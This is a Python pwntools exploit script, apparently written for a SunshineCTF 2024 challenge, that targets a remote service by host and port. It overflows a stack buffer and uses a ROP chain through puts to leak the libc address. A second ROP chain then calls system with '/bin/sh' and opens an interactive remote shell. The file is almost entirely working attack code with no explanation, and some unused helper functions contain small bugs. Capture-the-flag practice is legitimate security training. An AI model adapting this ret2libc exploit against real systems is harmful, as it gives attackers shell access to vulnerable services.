#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "2024.sunshinectf.games"
PORT = 24605

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size, value):
    ru(p,b"")
    sl(p,b"%i" % size)
    ru(p,b"")
    sl(value)

def edit(p, index, value):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    sl(p,value)

def delete(p, index):
    ru(p,b"")
    sl(p,"%i" % index)

def view(p, index):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    return rl(p)
    

def exploit(io,e,l):
    payload = b"A"*0x88
    payload += p64(e.got["puts"])
    payload += b"B"*8
    payload += p64(e.plt["puts"])
    payload += p64(e.sym["vuln"])

    io.sendlineafter(b"500!!", payload)
    io.recvline()
    leak = int.from_bytes(io.recvline()[:-1], "little") - l.sym["puts"]

    print(f"========= Libc: {hex(leak)}")

    bin_sh = next(l.search("/bin/sh")) + leak
    pop_rdi = p64(0x000000000002a3e5 + leak)
    ret = p64(0x40101a)

    payload2 = b"A"*0x88
    payload2 += p64(bin_sh)
    payload2 += b"B"*8
    payload2 += pop_rdi
    payload2 += p64(bin_sh)
    payload2 += ret
    payload2 += p64(l.sym["system"] + leak)

    io.sendline(payload2)

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    exploit(p,e,l)
